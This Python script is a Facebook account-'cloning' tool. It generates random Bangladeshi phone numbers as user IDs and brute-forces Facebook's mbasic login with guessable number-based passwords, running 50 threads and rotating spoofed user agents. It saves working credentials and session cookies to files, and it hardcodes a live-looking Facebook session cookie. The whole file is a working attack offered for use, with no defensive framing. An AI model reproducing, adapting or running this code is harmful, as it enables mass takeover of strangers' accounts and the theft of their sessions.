# Facebook: Alamin Mahamud
# Github: Atalamin
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
 
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://facebook.com/groups/513417670932164/')
logo =(""" \x1b[38;5;196m╔═══════════════════════════════════════════╗
 \x1b[38;5;196m║ \033[1;97m╔═════════╗╔════════╗╔════════╗╔════════╗ \x1b[38;5;196m║
 \x1b[38;5;196m║ \033[1;97m║\x1b[38;5;196m ██████  \033[1;97m║║ \033[33;1m█████  \033[1;97m║║\033[38;5;46m██████ \033[1;97m ║║\x1b[38;5;196m██   ██ \033[1;97m║ \x1b[38;5;196m║
 \x1b[38;5;196m║ \033[1;97m║ \x1b[38;5;196m██   ██ \033[1;97m║║\033[33;1m██   ██ \033[1;97m║║\033[38;5;46m██   ██ \033[1;97m║║\x1b[38;5;196m██  ██  \033[1;97m║ \x1b[38;5;196m║
 \x1b[38;5;196m║\033[1;97m ║\x1b[38;5;196m ██   ██ \033[1;97m║║\033[33;1m███████ \033[1;97m║║\033[38;5;46m██████  \033[1;97m║║\x1b[38;5;196m█████ \033[1;97m  ║ \x1b[38;5;196m║
 \x1b[38;5;196m║ \033[1;97m║ \x1b[38;5;196m██   ██ \033[1;97m║║\033[33;1m██   ██ \033[1;97m║║\033[38;5;46m██   ██ \033[1;97m║║\x1b[38;5;196m██  ██  \033[1;97m║ \x1b[38;5;196m║
 \x1b[38;5;196m║ \033[1;97m║ \x1b[38;5;196m██████  \033[1;97m║║\033[33;1m██   ██ \033[1;97m║║\033[38;5;46m██   ██ \033[1;97m║║\x1b[38;5;196m██   ██ \033[1;97m║ \x1b[38;5;196m║
 \x1b[38;5;196m║ \033[1;97m╚═════════╝╚════════╝╚════════╝╚════════╝\x1b[38;5;196m ║
 \x1b[38;5;196m║ \033[1;97m╔══════════╗╔════════╗╔════════╗╔═══════╗ \x1b[38;5;196m║
 \x1b[38;5;196m║ \033[1;97m║\033[38;5;46m██     ██ \033[1;97m║║\x1b[38;5;196m███████ \033[1;97m║║\033[33;1m██████\033[1;97m  ║║ \033[38;5;46m🔥N🔥 \033[1;97m║\x1b[38;5;196m ║
 \x1b[38;5;196m║ \033[1;97m║\033[38;5;46m██     ██ \033[1;97m║║\x1b[38;5;196m██      \033[1;97m║║\033[33;1m██   ██\033[1;97m ║║ \033[38;5;46m🔥A🔥 \033[1;97m║ \x1b[38;5;196m║
 \x1b[38;5;196m║ \033[1;97m║\033[38;5;46m██  █  ██ \033[1;97m║║\x1b[38;5;196m█████   \033[1;97m║║\033[33;1m██████\033[1;97m  ║║ \033[38;5;46m🔥Y🔥 \033[1;97m║ \x1b[38;5;196m║
 \x1b[38;5;196m║\033[1;97m ║\033[38;5;46m██ ███ ██ \033[1;97m║║\x1b[38;5;196m██      \033[1;97m║║\033[33;1m██   ██ \033[1;97m║║ \033[38;5;46m🔥E🔥 \033[1;97m║\x1b[38;5;196m ║
 \x1b[38;5;196m║ \033[1;97m║ \033[38;5;46m███ ███  \033[1;97m║║\x1b[38;5;196m███████ \033[1;97m║║\033[33;1m██████\033[1;97m  ║║ \033[38;5;46m🔥M🔥 \033[1;97m║ \x1b[38;5;196m║
 \x1b[38;5;196m║ \033[1;97m╚══════════╝╚════════╝╚════════╝╚═══════╝ \x1b[38;5;196m║
 \x1b[38;5;196m╚═══════════════════════════════════════════╝
 \x1b[38;5;196m╔══════════════╗\033[38;5;46m࿇⃝🌹 ⃢N⃢🌹⃝ ࿇\x1b[38;5;196m╔══════════════════╗
 \x1b[38;5;196m║\033[1;97m[🔵]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m ║\033[38;5;46m࿇⃝🌹 ⃢A⃢🌹⃝ ࿇\x1b[38;5;196m║\033[38;5;46mNAYEM             \x1b[38;5;196m║
 \x1b[38;5;196m║\033[1;97m[🔵]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 \x1b[38;5;196m ║\033[38;5;46m࿇⃝🌹 ⃢Y⃢🌹⃝ ࿇\x1b[38;5;196m║\033[38;5;46mMD NAYEM HASAN    \x1b[38;5;196m║
 \x1b[38;5;196m║\033[1;97m[🔵]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 \x1b[38;5;196m ║\033[38;5;46m࿇⃝🌹 ⃢E⃢🌹⃝ ࿇\x1b[38;5;196m║\033[38;5;46m+𝟖𝟖𝟎865272669     \x1b[38;5;196m║
 \x1b[38;5;196m║\033[1;97m[🔵]\033[38;5;46mTAEM     \x1b[38;5;196m ║\033[38;5;46m࿇⃝🌹 ⃢M⃢🌹⃝ ࿇\x1b[38;5;196m║\033[38;5;46mAID               \x1b[38;5;196m║
 \x1b[38;5;196m║\033[1;97m[🔵]\033[38;5;46m𝐒𝐓𝐀𝐓𝐔𝐒   \x1b[38;5;196m ║\033[38;5;46m࿇⃝🌹 ⃢A🌹⃝ ࿇\x1b[38;5;196m║\033[38;5;46m𝐅𝐑𝐄𝐄              \x1b[38;5;196m║
 \x1b[38;5;196m║\033[1;97m[🔵]\033[38;5;46m𝐖𝐎𝐑𝐊𝐒    \x1b[38;5;196m ║\033[38;5;46m࿇⃝🌹 ⃢I🌹⃝ ࿇\x1b[38;5;196m║\033[38;5;46m𝐃𝐀𝐓𝐀 & 𝐖𝐈𝐅𝐈       \x1b[38;5;196m║
 \x1b[38;5;196m║\033[1;97m[🔵]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m ║\033[38;5;46m࿇⃝🌹 ⃢D🌹⃝ ࿇\x1b[38;5;196m║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        \x1b[38;5;196m║
 \x1b[38;5;196m╚══════════════╝\033[38;5;46m࿇⃝🌹💔🌹⃝ ࿇\x1b[38;5;196m╚══════════════════╝\033[1;37m\n""")
loop = 0
oks = []
cps = []
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
yyyy='datr=FZzUZBT6QlNwffNrIrzJlUll;sb=FZzUZKtsUmUeaPxxNcA12vzF;c_user=100094247616773;xs=46%3AmTS1CHaSOuTCYQ%3A2%3A1691655204%3A-1%3A5286;fr=0XRJHdRwISkSU4Cua.AWUsOpBFlEDhdASxi912eEfXtVY.Bk1Jwi.OX.AAA.0.0.Bk1Jwi.AWUsNxRE7tY;m_page_voice=100094247616773'
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' [{xr}^{x}] Example>: {xr}019,017,018,92302,92301,91778{x}')
    print(" ══════════════════════════════════════════")
    rk1 = '0191'
    rk2 = '0192'
    rk3 = '0195'
    rk4 = '019'
    code = random.choice([rk1,rk2,rk3,rk4])                    # input(f' [{xr}■{x}] Choose : ')
    os.system('clear')
    print(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;98m50000 \033[0;92m] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        jalan('\033[1;97m====================================================')
        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        jalan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
			'method': 'GET',
			'path': 'https://www.facebook.com/?_rdc=1&_rdr',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'en-US,en;q=0.9',
			'referer': 'https://t.facebook.com/',
			'sec-ch-ua': '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'upgrade-insecure-requests': '1',
			'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[𓆩♡𓆪A I D-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/A-I-D_OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\033[1;32m[𓆩♡𓆪A I D-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺𓀐𓂸]\033[0;93m COOKIE = \033[1;32m'+yyyy+  '  ''  \033[0;97m')
                open('/sdcard/A-I-D-CP.txt', 'a').write( uid+' | '+ps+' \n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}A I D{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
 
xxr()